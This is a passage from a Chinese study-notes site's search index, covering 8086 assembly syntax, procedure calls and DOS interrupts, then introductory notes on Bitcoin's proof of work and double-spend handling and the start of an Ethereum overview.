\u5f15\u7528\u5b83\u65f6\u8981\u52a0\u4e0a <code>far ptr</code> \u5f3a\u5236\u628a\u6807\u53f7\u7f16\u8bd1\u6210\u5b8c\u6574\u5730\u5740\uff0c\u5982\uff1a</p> <pre><code>code segment:\nassume cs:code, ds:data\n    ...statements...\n    jmp far ptr far_away; \u8df3\u8f6c\u5230\u8fdc\u6807\u53f7 far_away\nfar_back label far      ; \u5b9a\u4e49 far_back \u4e3a\u8fdc\u6807\u53f7\n    add al, abc[0]\n    mov ah, 4Ch\n    int 21h\n    ...statements\nmain:\n    ...statements\ncode ends\n\naway segment\nassume cs:code, ds:data\nfar_away label far      ; \u5b9a\u4e49 far_away \u4e3a\u8fdc\u6807\u53f7\n    mov al, abc[3]\n    jmp far ptr far_back; \u8df3\u8f6c\u5230\u8fdc\u6807\u53f7 far_back\naway ends\nend main\n</code></pre> <p>\u5f53\u8df3\u8f6c\u6307\u4ee4\u5411\u540e\u5f15\u7528\u8fdc\u6807\u53f7\u65f6\uff0c\u53ef\u4ee5\u5c06 <code>far ptr</code> \u7701\u7565\uff0c\u5982\u4e0a\u9762\u7684 <code>jmp far_away</code></p> <p>\u5047\u8bbe\u6709\u4e00\u53d8\u91cf\u540d <code>var</code>\uff0c\u5219\u5728\u4ee3\u7801\u6bb5\u4e2d\u65e2\u53ef\u4ee5\u7528 <code>var</code> \u53c8\u53ef\u4ee5\u7528 <code>[var]</code> \u6765\u5f15\u7528\u8be5\u53d8\u91cf\uff1b\u5047\u8bbe\u6709\u4e00 <code>db</code> \u7c7b\u578b\u53d8\u91cf\u6570\u7ec4 <code>a</code> \uff0c\u5219\u5728\u4ee3\u7801\u6bb5\u4e2d\u65e2\u53ef\u4ee5\u7528 <code>a[1]</code> \u53c8\u53ef\u4ee5\u7528 <code>[a+1]</code> \u5f00\u5f15\u7528\u8be5\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002</p> <p>\u5728\u6570\u636e\u6bb5\u4e2d\uff0c<code>var</code> \u6216 <code>offset var</code> \u90fd\u53ef\u4f5c\u4e3a\u4f2a\u6307\u4ee4 <code>dw</code> \u7684\u64cd\u4f5c\u6570\u8868\u793a\u53d8\u91cf <code>var</code> \u7684\u504f\u79fb\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u5c06 <code>var</code> \u4f5c\u4e3a <code>dd</code> \u7684\u64cd\u4f5c\u6570\u8868\u793a\u53d8\u91cf <code>var</code> \u7684\u504f\u79fb\u5730\u5740\u3001\u6bb5\u5730\u5740\uff1b\u4f46\u662f\u5728\u4ee3\u7801\u6bb5\u4e2d\u53ea\u80fd\u7528 <code>offset var</code> \u6765\u5f15\u7528\u5176\u504f\u79fb\u5730\u5740\uff0c\u7528 <code>seg var</code> \u6216\u6570\u636e\u6bb5\u540d\u6765\u5f15\u7528\u5176\u6bb5\u5730\u5740\uff1a</p> <pre><code>data segment:\nxyz db 'W'\naddr1 dw offset xyz ; \u4e5f\u53ef\u4ee5\u5199\u6210 addr1 dw xyz\naddr2 dd xyz        ; \u4e5f\u53ef\u4ee5\u5199\u6210 addr2 dw offset xyz, seg xyz\n</code></pre> \u4f4d\u7f6e\u8ba1\u6570\u5668 <p>\u5728\u6bb5\u5b9a\u4e49\u5f00\u59cb\u65f6\uff0c\u7f16\u8bd1\u5668\u81ea\u52a8\u5c06\u4f4d\u7f6e\u8ba1\u6570\u5668\u6e05\u96f6\uff0c\u7136\u540e\u6bcf\u7f16\u8bd1\u5b8c\u4e00\u6761\u6307\u4ee4\u6216\u4f2a\u6307\u4ee4\u8bed\u53e5\uff0c\u7f16\u8bd1\u5668\u4f1a\u628a\u8be5\u6307\u4ee4\u8bed\u53e5\u5b57\u8282\u7801\u7684\u5b57\u8282\u6570\u52a0\u5230\u4f4d\u7f6e\u8ba1\u6570\u5668\u4e2d\u3002\u5728\u6c47\u7f16\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>$</code> \u6765\u83b7\u53d6\u5f53\u524d\u4f4d\u7f6e\u7684\u4f4d\u7f6e\u8ba1\u6570\u5668\u7684\u503c\u3002</p>"},{"location":"Courses/8086asm/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%BA%90%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F/#_6","title":"\u8fc7\u7a0b\u8c03\u7528","text":"<p>\u901a\u8fc7\u5806\u6808\u4f20\u9012\u53c2\u6570\uff0c\u5728 <code>call</code> \u6307\u4ee4\u524d\u5c06\u53c2\u6570\u6309\u7167\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u5165\u6808(\u5bf9\u5e94\u7684\u6808\u4ece\u4e0a\u5230\u4e0b)\uff0c\u7136\u540e\u5148\u5728\u51fd\u6570\u5f00\u5934\u6267\u884c <code>push bp</code>, <code>mov bp, sp</code> \u83b7\u53d6\u5f53\u524d\u72b6\u6001\u6808\u9876\u5730\u5740\u5b58\u5165 <code>bp</code> \u3002\u7531\u4e8e <code>call</code> \u6307\u4ee4\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u8fd4\u56de\u5730\u5740\u4e5f\u538b\u5165\u5806\u6808\uff0c\u56e0\u6b64\u5b9e\u9645\u8c03\u7528\u53c2\u6570\u8981\u4ece <code>[bp+4]</code> \u5f00\u59cb(also <code>ss:[bp+4]</code>)\uff1a</p> <pre><code>code segment\nassume cs:code\nf:  ; f(int a, int b) return a+b\n    push bp\n    mov bp, sp\n    mov ax, [bp+4]  ; a\n    add ax, [bp+6]  ; b\n    pop bp          ; \u6062\u590d bp\n    ret   ; return \u6307\u4ee4\u540c\u6837\u4f1a pop \u6808\u627e\u51fa\u8fd4\u56de\u5730\u5740\n\nmain:\n    mov ax, 3\n    push ax\n    mov ax, 2\n    push ax\n    call f  ; call \u6307\u4ee4\u4f1a\u5c06\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u538b\u5165\u6808\nback:\n    add sp, 4  ; \u6e05\u7a7a\u6808\ncode ends\nend main\n</code></pre> <p>\u5982\u679c\u51fd\u6570\u6709\u8fd4\u56de\u503c\uff0c\u4e00\u822c\u6839\u636e\u4f4d\u6570\u4f7f\u7528 <code>al,ax,eax</code> \u6765\u5b58\u50a8\u8fd4\u56de\u503c\u3002</p> <p>How to return 64 bit?</p> <p>\u4f7f\u7528 <code>edx:eax</code> \u5206\u522b\u5b58\u50a8\u9ad8\u4f4d\u548c\u4f4e\u4f4d</p> <p>\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\uff0c\u4f9d\u7167\u4e0d\u540c\u7684\u89c4\u5219\u9700\u8981\u4fdd\u8bc1\u4e00\u4e9b\u5bc4\u5b58\u5668\u7684\u524d\u540e\u503c\u4e0d\u53d8\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u51fd\u6570\u5f00\u5934\u548c\u7ed3\u5c3e\u4fdd\u5b58\u5b83\u4eec\u7684\u72b6\u6001\u5e76\u6062\u590d\u3002</p> <p>\u4e2d\u65ad\u7684\u8c03\u7528\u5176\u5b9e\u76f8\u5f53\u4e8e\u5185\u7f6e\u51fd\u6570\u7684\u8c03\u7528\uff0c\u4e2d\u65ad\u51fd\u6570\u7684\u5730\u5740\u5b58\u50a8\u5728\u5185\u5b58 <code>0000:0000</code> \u540e\uff0c\u6bcf\u56db\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u6761\u4e2d\u65ad\u6307\u4ee4\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5982\u4e0b\u6240\u793a\u7684\u4e00\u6bb5\u5185\u5b58\uff1a</p> <pre><code>0000:0054:  40h\n0000:0055:  02h\n0000:0056:  58h\n0000:0057:  02h\n0000:0058:  2Dh   &lt;- int 16h \u4e2d\u65ad\u5411\u91cf\u8d77\u59cb\u5730\u5740\n0000:0059:  04h\n0000:005A:  70h\n0000:005B:  00h\n</code></pre> <p>\u5bf9\u4e8e\u6307\u4ee4 <code>int 16h</code> \uff0c\u5176\u4e2d\u65ad\u5411\u91cf\u4f4d\u4e8e <code>0000:16h*4</code> \uff0c\u5373\u8d77\u59cb\u5730\u5740\u4e3a <code>0000:0058</code> \uff0c\u5e76\u4e14\u6309\u7167\u5c0f\u7aef\u5b58\u50a8\u89c4\u5219\uff0c\u5f53\u6211\u4eec\u8c03\u7528\u4e2d\u65ad\u6307\u4ee4 <code>int 16h</code> \u65f6\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5e94\u4e3a <code>0070:042D</code>\uff0c\u8fd9\u65f6 <code>CS=0070h, IP=042Dh</code>\u3002</p> <p><code>int 21h</code> \u7684\u5e38\u7528\u4e2d\u65ad\uff1a</p> AH \u529f\u80fd \u8865\u5145\u89e3\u91ca 01 \u6709\u56de\u663e\u5730\u8bfb\u53d6\u4e00\u4e2a\u6807\u51c6\u8f93\u5165 AL=\u8f93\u5165\u5b57\u7b26, \u5b9e\u9645\u4f7f\u7528\u4e2d\u8fd8\u53ef\u4ee5\u7528\u4f5c\u672b\u5c3e\u6572\u4efb\u610f\u952e\u7ed3\u675f\u7a0b\u5e8f 02 \u8f93\u51fa\u5b57\u7b26\u5230\u6807\u51c6\u8f93\u51fa DL=\u8f93\u51fa\u5b57\u7b26 09 \u8f93\u51fa\u5b57\u7b26\u4e32\u5230\u6807\u51c6\u8f93\u51fa DS:DX=\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u4e00\u76f4\u5230 '$' \u505c\u6b62\u8f93\u51fa 4C \u5e26\u8fd4\u56de\u7801\u7ec8\u6b62 AL=\u8fd4\u56de\u7801"},{"location":"Courses/Blockchain/","title":"Index","text":"<p> \u7ea6 0 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/Blockchain/btc/","title":"\u6bd4\u7279\u5e01","text":""},{"location":"Courses/Blockchain/btc/#_1","title":"\u6bd4\u7279\u5e01","text":"<p> \u7ea6 1389 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/Blockchain/btc/#_2","title":"\u7b80\u4ecb","text":"<p>\u6bd4\u7279\u5e01\u662f\u57fa\u4e8e\u5bc6\u7801\u5b66\u7684\u4e00\u79cd\u7535\u5b50\u8d27\u5e01\uff0c\u662f\u4e00\u79cd\u53bb\u4e2d\u5fc3\u5316\u7684\u94fe\u5f0f\u201c\u8bb0\u8d26\u65b9\u5f0f\u201d\uff0c\u8d77\u6e90\u4e8e 2008 \u5e74\u4e2d\u672c\u806a\u7684\u300a\u767d\u76ae\u4e66\u300b\u3002</p> <p>\u6bcf\u4e2a\u5341\u5206\u949f\uff08\u5de6\u53f3\uff09\u5185\u7684\u8d26\u5355\u90fd\u4f1a\u88ab\u6253\u5305\u6210\u4e00\u4e2a\u533a\u5757\uff0c\u5e76\u5c06\u5176\u94fe\u63a5\u5230\u4ee5\u524d\u7684\u5757\u4e0a\uff0c\u5f62\u6210\u94fe\u5f0f\u7ed3\u6784\u3002</p> <p>\u4e00\u4e2a\u533a\u5757\u5927\u5c0f\u5927\u7ea6\u5728 1MB\uff0c\u53ef\u4ee5\u5b58 4000 \u6761\u5de6\u53f3\u8bb0\u5f55\uff0c\u5177\u4f53\u6570\u76ee\u53d6\u51b3\u4e8e\u8bb0\u5f55\u5927\u5c0f</p> <p>\u7279\u6b8a\u7684\u662f\uff0c\u6253\u5305\u8fd9\u4e00\u64cd\u4f5c\u5e76\u4e0d\u662f\u7531\u4e00\u4e2a\u5b98\u65b9\u7684\u673a\u6784\u6765\u7edf\u4e00\u5b8c\u6210\uff0c\u800c\u662f\u4efb\u4f55\u63a5\u6536\u5230\u8fd9\u4e00\u65f6\u95f4\u6bb5\u6240\u6709\u8d26\u5355\u8bb0\u5f55\u7684\u4eba\u90fd\u53ef\u4ee5\u5b8c\u6210\u3002\u6253\u5305\u8fd9\u4e2a\u533a\u5757\u7684\u4eba\u4e0d\u4ec5\u53ef\u4ee5\u83b7\u5f97\u201c\u6253\u5305\u5956\u52b1\u201d\uff0c\u8fd8\u4f1a\u4ece\u8be5\u533a\u5757\u4e2d\u7684\u4ea4\u6613\u4e2d\u83b7\u5f97\u4e00\u5b9a\u624b\u7eed\u8d39\uff0c\u8fd9\u4e5f\u662f\u8fd9\u4e48\u591a\u4eba\u70ed\u8877\u4e8e\u6316\u77ff\u7684\u539f\u56e0\u3002</p> <p>\u6253\u5305\u5956\u52b1\uff1a\u5de5\u4f5c\u91cf\u8bc1\u660e</p> <p>\u6253\u5305\u5956\u52b1\u6bcf\u56db\u5e74\u51cf\u534a\uff0c2009 \u5e74\u4e3a 50 bitcoin\uff0c\u73b0\u5728 2025 \u5e74\u662f 3.125 bitcoin\u3002\u603b bitcoin \u91cf\u5927\u7ea6\u4e3a\uff1a</p> \\[50\\times 6 \\times 24 \\times 365 \\times 4 \\times( 1 + \\frac{1}{2}+ \\frac{1}{4}...)=2100\u4e07\\] <p>\u7531\u4e8e\u662f\u53bb\u4e2d\u5fc3\u5316\u7684\u7cfb\u7edf\uff0c\u4e00\u4e2a\u4eba\u53d1\u8d77\u7684\u8d26\u5355\u4f1a\u88ab\u5e7f\u64ad\u5230\u6240\u6709\u4eba\u624b\u4e2d\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u5bfc\u81f4\u4e0d\u540c\u7684\u4eba\u63a5\u6536\u5230\u7684\u8d26\u5355\u987a\u5e8f\u6709\u5148\u540e\u533a\u522b\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u4ee5\u8c01\u6253\u5305\u7684\u533a\u5757\u4e3a\u51c6\u5462\uff1f\u56e0\u6b64\u6211\u4eec\u6709\u4e00\u4e2a\u5de5\u4f5c\u91cf\u8bc1\u660e\uff0c\u8981\u6c42\u6253\u5305\u8005\u9700\u8981\u89e3\u51b3\u4e00\u4e2a\u65e0\u6cd5\u76f4\u63a5\u5f97\u5230\u89e3\u7b54\u7684\u5bc6\u7801\u5b66\u95ee\u9898\uff0c\u8c01\u5148\u5b8c\u6210\u8c01\u5c31\u6709\u6743\u5229\u8fdb\u884c\u6253\u5305\u3002</p> <p>\u8be5\u5bc6\u7801\u5b66\u95ee\u9898\u5177\u4f53\u5982\u4e0b\uff1a</p> <p>\u6bcf\u4e00\u4e2a\u533a\u5757\u90fd\u6709\u5404\u81ea\u7684\u533a\u5757\u54c8\u5e0c\uff0c\u8be5\u54c8\u5e0c\u503c\u901a\u8fc7\u5bf9\u4e0a\u4e00\u4e2a\u533a\u5757\u7684\u533a\u5757\u54c8\u5e0c\u3001\u5f53\u524d\u533a\u5757\u5185\u6240\u6709\u8d26\u5355\u7684\u54c8\u5e0c\u3001\u5f53\u524d\u65f6\u95f4\u4ee5\u53ca\u4e00\u4e2a\u968f\u673a\u6570\u8fd9\u56db\u4e2a\u90e8\u5206\u8fdb\u884c\u4e24\u6b21\u54c8\u5e0c\u6563\u5217\u7b97\u6cd5\u5f97\u5230\uff0c\u7b97\u51fa\u6765\u7684\u533a\u5757\u54c8\u5e0c\u5fc5\u987b\u8981\u6c42\u524d \\(n\\) \u4f4d\u4e3a 0\u3002</p> <p>\u8fd9\u56db\u4e2a\u90e8\u5206\u53ea\u6709\u968f\u673a\u6570\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u6253\u5305\u8005\u9700\u8981\u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u968f\u673a\u6570\u624d\u80fd\u8fdb\u884c\u6253\u5305\u3002</p> <p>\u7531\u4e8e\u6bcf\u4e2a\u4eba\u7684\u8d26\u5355\u4fe1\u606f\u3001\u65f6\u95f4\u53ef\u80fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u4e0d\u540c\u4eba\u7684\u6253\u5305\u96be\u5ea6\u4e0d\u540c\uff0c\u5373\u968f\u673a\u6570\u4e0d\u540c</p> <p>\u53c2\u6570 \\(n\\) \u662f\u52a8\u6001\u786e\u5b9a\u7684\uff0c\u51b3\u5b9a\u4e86\u8be5\u95ee\u9898\u7684\u96be\u5ea6\u3002\u603b\u4f53\u4e0a\uff0c\u6211\u4eec\u5e0c\u671b\u8fd9\u4e2a\u7cfb\u7edf\u80fd\u4ee5 10 \u5206\u949f\u4e00\u6b21\u7684\u6253\u5305\u901f\u5ea6\u8fd0\u884c\uff0c\u56e0\u6b64\u5f53\u603b\u4f53\u7b97\u529b\u66f4\u591a\u65f6\uff0c\u53c2\u6570 \\(n\\) \u5c31\u8d8a\u5927\u3002</p> <p></p>"},{"location":"Courses/Blockchain/btc/#_3","title":"\u4fe1\u7528\u95ee\u9898","text":"<p>\u4e3a\u4e86\u4fdd\u8bc1\u6bd4\u7279\u5e01\u4ea4\u6613\u8bb0\u5f55\u662f\u771f\u5b9e\u7684\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u7535\u5b50\u7b7e\u540d\u4ee5\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u3002</p> <p>\u4e00\u4e2a\u6bd4\u7279\u5e01\u7684\u7528\u6237\u5728\u6ce8\u518c\u65f6\u4f1a\u83b7\u5f97\u4ed6\u7684\u516c\u79c1\u94a5\u548c\u5730\u5740\uff0c\u5176\u4e2d\u516c\u94a5\u548c\u5730\u5740\u90fd\u662f\u516c\u5f00\u7684\u3002\u5bf9\u4e8e\u7535\u5b50\u7b7e\u540d\uff0c\u6211\u4eec\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u4f7f\u7528\u516c\u94a5\u8fdb\u884c\u89e3\u5bc6\u3002</p> <p>\u7528\u6237 A \u5728\u521b\u5efa\u4e00\u6761\u8bb0\u5f55\u65f6\uff0c\u5148\u5bf9\u8be5\u8bb0\u5f55\u8fdb\u884c\u6458\u8981\u7b97\u6cd5\uff08\u901a\u5e38\u4e5f\u662f\u54c8\u5e0c\uff09\uff0c\u7136\u540e\u4f7f\u7528\u79c1\u94a5\u5bf9\u8be5\u6458\u8981\u52a0\u5bc6\u5f97\u5230\u4e00\u4e2a\u5bc6\u7801\uff0c\u7136\u540e\u7528\u6237 A \u4f1a\u628a\u8be5\u8bb0\u5f55\u3001\u81ea\u5df1\u7684\u516c\u94a5\u3001\u52a0\u5bc6\u5f97\u5230\u7684\u5bc6\u7801\u8fd9\u4e09\u4e2a\u4fe1\u606f\u5e7f\u64ad\u7ed9\u6240\u6709\u4eba\u3002</p> <p>\u90a3\u4e48\u5176\u5b83\u63a5\u6536\u5230\u8be5\u6d88\u606f\u7684\u4eba\u5148\u5bf9\u8bb0\u5f55\u4e5f\u505a\u6458\u8981\u7b97\u6cd5\uff0c\u7136\u540e\u4f7f\u7528 A \u7684\u516c\u94a5\u89e3\u5bc6\u5bc6\u7801\uff0c\u5c06\u4e24\u8005\u8fdb\u884c\u6bd4\u8f83\u4ee5\u786e\u8ba4\u8be5\u5e7f\u64ad\u7684\u53d1\u8d77\u4eba\u662f A\uff0c\u5426\u5219\u5219\u62d2\u7edd\u8fd9\u6761\u6d88\u606f\u3002</p> <p>\u4f46\u662f\u5047\u5b9a A \u8d26\u6237\u4e2d\u53ea\u6709 10 btc\uff0c\u4ed6\u540c\u65f6\u53d1\u4e86\u4e24\u6761\u6d88\u606f\uff0c\u5206\u522b\u8981\u7ed9 B \u548c C \u90fd 10 btc\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u5904\u7406\uff1f\u8fd9\u4e2a\u95ee\u9898\u88ab\u79f0\u4e3a\u53cc\u91cd\u652f\u4ed8\u3002</p> <p>\u4f59\u989d\u68c0\u67e5</p> <p>\u6bd4\u7279\u5e01\u7684\u7528\u6237\u4f1a\u4e0b\u8f7d\u4ece\u521b\u4e16\u7eaa\u5f00\u59cb\u7684\u6240\u6709\u5757\u7684\u4fe1\u606f\uff0c\u56e0\u6b64\u4ed6\u77e5\u9053\u67d0\u4e2a\u7528\u6237\u7684\u8d26\u6237\u4e2d\u5e94\u8be5\u8fd8\u6709\u591a\u5c11\u94b1\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8ffd\u6eaf\u7684\u65b9\u5f0f\u6765\u67e5\u627e\u7528\u6237\u7684\u6bd4\u7279\u5e01\u83b7\u5f97\u8bb0\u5f55\uff0c\u56e0\u6b64\u4f59\u989d\u68c0\u67e5\u7684\u529f\u80fd\u662f\u53ef\u4ee5\u901a\u8fc7\u8ffd\u6eaf\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u8fd8\u662f\u91c7\u7528\u4e0a\u9762\u8bf4\u7684\u4f8b\u5b50\uff0c\u7528\u6237 A \u540c\u65f6\u5e7f\u64ad\u4e86\u201cA \u5411 B \u652f\u4ed8 10 btc\u201d\u548c\u201cA \u5411 C \u652f\u4ed8 10 btc\u201d\u4e24\u6761\u6d88\u606f\uff0c\u4f46\u662f\u4e0d\u540c\u4eba\u63a5\u6536\u5230\u8fd9\u4e24\u6761\u6d88\u606f\u7684\u5148\u540e\u987a\u5e8f\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u76f8\u540c\u7684\u662f\uff0c\u63a5\u6536\u5230\u7b2c\u4e00\u6761\u5e7f\u64ad\u6d88\u606f\u540e\uff0c\u7b2c\u4e8c\u6761\u5e7f\u64ad\u6d88\u606f\u5c31\u4f1a\u56e0\u4e3a\u4f59\u989d\u68c0\u67e5\u4e0d\u901a\u8fc7\u800c\u88ab\u62d2\u7edd\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5176\u4ed6\u7528\u6237\u53ea\u4f1a\u6301\u6709\u8fd9\u4e24\u6761\u652f\u4ed8\u6d88\u606f\u7684\u5176\u4e2d\u4e00\u6761\uff0c\u5f53\u67d0\u4e2a\u4eba\u6210\u529f\u6253\u5305\u6210\u5757\u5e76\u5c06\u5176\u94fe\u63a5\u5230\u4e3b\u94fe\u4e0a\u65f6\uff0c\u90a3\u6761\u6d88\u606f\u5c31\u4f1a\u88ab\u786e\u8ba4\uff0c\u800c\u53e6\u4e00\u6761\u6d88\u606f\u5c31\u4f1a\u88ab\u62d2\u7edd\u3002</p> <p>\u867d\u7136\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u7535\u5b50\u7b7e\u540d\u4fdd\u8bc1\u8bb0\u5f55\u7684\u5185\u5bb9\u4e0d\u4f1a\u88ab\u7be1\u6539\uff0c\u4f46\u8fd9\u4e0d\u80fd\u4fdd\u8bc1\u533a\u5757\u94fe\u4e0a\u7684\u533a\u5757\u4e2d\u7684\u67d0\u4e00\u6761\u8bb0\u5f55\u88ab\u76f4\u63a5\u5220\u6389\u3002</p> <p>\u7be1\u6539\u8005\u5220\u9664\u4e86\u67d0\u4e00\u533a\u5757\u4e0a\u7684\u4e00\u4e2a\u4ea4\u6613\u8bb0\u5f55\uff0c\u5e76\u5c06\u5176\u91cd\u65b0\u6253\u5305\u4e3a\u4e00\u4e2a\u65b0\u5757\u63a5\u5165\u533a\u5757\u94fe\uff0c\u4f46\u662f\u8fd9\u4e2a\u65b0\u5757\u5f88\u53ef\u80fd\u662f\u4e0d\u88ab\u5927\u4f17\u6240\u8ba4\u53ef\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u9ed8\u8ba4\u575a\u6301\u6700\u957f\u94fe\u539f\u5219\uff0c\u800c\u8be5\u533a\u5757\u6240\u5206\u53c9\u51fa\u6765\u7684\u65b0\u94fe\u589e\u957f\u901f\u5ea6\u5f80\u5f80\u6162\u4e8e\u4e3b\u94fe\uff0c\u56e0\u4e3a\u4e3b\u94fe\u662f\u5168\u4e16\u754c\u4e00\u8d77\u7b97\uff0c\u800c\u65b0\u94fe\u53ea\u6709\u7be1\u6539\u8005\u4e00\u4e2a\u4eba\u5728\u7b97\uff0c\u56e0\u6b64\u5bf9\u533a\u5757\u94fe\u7684\u7be1\u6539\u4e5f\u662f\u975e\u5e38\u96be\u4ee5\u5b9e\u73b0\u7684\u3002</p> <p>\u968f\u7740\u94fe\u957f\u5ea6\u589e\u52a0\uff0c\u5bf9\u524d\u9762\u7684\u533a\u5757\u7684\u6539\u52a8\u96be\u5ea6\u5c31\u8d8a\u5927\uff0c\u6240\u4ee5\u5927\u989d\u4ea4\u6613\u90fd\u9700\u8981\u7b49\u5f85\u51e0\u4e2a\u5757\u624d\u8ba4\u4e3a\u771f\u5b9e</p>"},{"location":"Courses/Blockchain/eth/","title":"\u4ee5\u592a\u574a","text":""},{"location":"Courses/Blockchain/eth/#_1","title":"\u4ee5\u592a\u574a","text":"<p> \u7ea6 2996 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>\u4ee5\u592a\u574a\u4e0e\u6bd4\u7279\u5e01\u7684\u5f02\u540c</p> \u7c7b\u4f3c\u6bd4\u7279\u5e01\u4e4b\u5904\u4e0e\u6bd4\u7279\u5e01\u7684\u4e0d\u540c <ul> <li>\u662f\u4e00\u4e2a\u53bb\u4e2d\u5fc3\u7684\u533a\u5757\u94fe\u5e73\u53f0</li> <li>\u591a\u4e2a\u8282\u70b9\u53c2\u4e0e\u7ec4\u6210 P2P \u7f51\u7edc\uff0c\u6ca1\u6709\u4efb\u4f55\u8282\u70b9\u6709\u7279\u6b8a\u6743\u9650</li> <li>\u5404\u8282\u70b9\u53ef\u4ee5\u53d1\u51fa transaction\uff0c\u4e5f\u53ef\u4ee5\u8bb0\u5f55\u5e76\u6267\u884c\u7f51\u7edc\u4e0a\u53d1\u51fa\u7684 transaction</li> <li>\u4ea4\u6613\u88ab\u8282\u70b9\u6253\u5305\u6210\u4e00\u4e2a\u201c\u533a\u5757\u201d\uff0c\u6bcf\u4e2a\u533a\u5757\u52a0\u4e0a\u7d22\u5f15\u4e00\u6b21\u8fde\u63a5\uff0c\u5f62\u6210\u533a\u5757\u94fe</li> </ul> <ul> <li>\u4ee5\u592a\u574a\u5f15\u5165\u4e86\u53ef\u7f16\u7a0b\u667a\u80fd\u5408\u7ea6\uff0c\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u66f4\u5927\u7075\u6d3b\u6027</li> <li>\u4ee5\u592a\u574a\u6709\u66f4\u5feb\u51fa\u5757\u901f\u5ea6\u548c\u66f4\u5148\u8fdb\u5956\u52b1\u673a\u5236<ul> <li>\u6bd4\u7279\u5e01\u7ea6 10min \u51fa\u4e00\u4e2a\u5757\uff0c\u4ee5\u592a\u574a\u7ea6 13-15s \u51fa\u4e00\u4e2a\u5757</li> </ul> </li> <li>\u4ee5\u592a\u574a\u50cf\u5b89\u5353\u4e00\u6837\u63d0\u4f9b\u4e86\u4e30\u5bcc API \u548c\u63a5\u53e3\uff0c\u793e\u533a\u6d3b\u8dc3\uff0c\u5bb9\u6613\u5f00\u53d1\u5e94\u7528</li> <li>\u4ee5\u592a\u574a\u4ee5\u524d\u91c7\u7528 PoW\uff08Power of Work\uff09\u673a\u5236\uff0c\u73b0\u5728\u91c7\u7528 PoS\uff08Power of Stake\uff09\uff0c\u4e00\u4e2a\u533a\u5757\u5956\u52b1 2 \u4e2a\u4ee5\u592a\u5e01</li> <li>\u6bd4\u7279\u5e01\u4f7f\u7528\u7684 UTXO \u6a21\u578b\u662f\u4e00\u79cd\u5bf9\u5f00\u53d1\u53cb\u597d\u3001\u6613\u4e8e\u7ed3\u7b97\u7684\u6a21\u578b\uff1b\u800c\u4ee5\u592a\u574a\u4f7f\u7528\u4f59\u989d\u6a21\u578b\uff0c\u5bf9\u7528\u6237\u66f4\u53cb\u597d\uff0c\u8fd9\u4e0e\u4f20\u7edf\u91d1\u878d\u8d26\u6237\u4e00\u81f4</li> </ul>"},{"location":"Courses/Blockchain/eth/#_2","title":"\u7b80\u4ecb","text":"<p>\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u662f\u533a\u5757\u94fe\u4e2d\u76ee\u524d\u5e94\u7528\u6700\u5e7f\u7684\u4e24\u6761\u4e3b\u94fe\u3002\u76f8\u6bd4\u4e8e\u6bd4\u7279\u5e01\u53ea\u5b9e\u73b0\u4e86\u6700\u57fa\u672c\u7684\u8f6c\u8d26\u529f\u80fd\uff0c\u4ee5\u592a\u574a\u80fd\u591f\u6709\u66f4\u591a\u65b9\u9762\u7684\u5e94\u7528\u3002</p> <p>\u4ee5\u592a\u574a\uff08Ethereum\uff09\u662f\u4e00\u4e2a\u53bb\u4e2d\u5fc3\u5316\u3001\u5f00\u6e90\u5e76\u4e14\u5177\u5907\u667a\u80fd\u5408\u7ea6\u529f\u80fd\u7684\u516c\u5171\u533a\u5757\u94fe\u5e73\u53f0\uff0c\u5176\u6838\u5fc3\u7ec4\u4ef6\u4e3a\u4ee5\u592a\u574a\u865a\u62df\u673a\uff08Ethereum Virtual Machine, EVM\uff09\u3002EVM \u662f\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u7a0b\u5e8f\u7684\u4e13\u7528\u8fd0\u884c\u73af\u5883\uff0c\u8fd9\u4f7f\u5f97\u6bcf\u4e2a\u8282\u70b9\u7684\u8bbe\u5907\u73af\u5883\u90fd\u80fd\u8fd0\u884c\u667a\u80fd\u5408\u7ea6\u3002</p> <p>\u4ee5\u592a\u574a\u6574\u4f53\u67b6\u6784</p> <p></p> <p>\u4ee5\u592a\u574a\u4f7f\u7528\u52a0\u5bc6\u8d27\u5e01\u4ee5\u592a\u5e01\uff08Ether, ETH\uff09\u4f5c\u4e3a\u5185\u90e8\u4ea4\u6613\u7684 